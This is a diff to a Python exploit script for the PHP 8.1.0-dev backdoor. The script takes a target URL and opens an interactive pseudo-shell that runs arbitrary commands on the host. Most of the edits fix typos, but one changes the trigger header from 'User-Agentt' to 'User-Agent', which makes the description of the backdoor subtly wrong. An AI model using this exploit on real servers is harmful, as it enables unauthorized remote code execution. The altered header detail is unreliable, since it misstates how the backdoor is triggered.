@@ -15,8 +15,8 @@ Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
 Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
 Contact: flast101.sec@gmail.com
 
-An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
-The following exploit uses the backdoor to provide a pseudo shell ont the host.
+An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agent header.
+The following exploit uses the backdoor to provide a pseudo shell on the host.
 """
 
 #!/usr/bin/env python3
@@ -24,12 +24,12 @@ import os
 import re
 import requests
 
-host = input("Enter the host url:\n")
+host = input("Enter the host url: ")
 request = requests.Session()
 response = request.get(host)
 
 if str(response) == '<Response [200]>':
-    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
+    print("\nInteractive shell is opened on", host, "\nCan't access tty; job control turned off.")
     try:
         while 1:
             cmd = input("$ ")
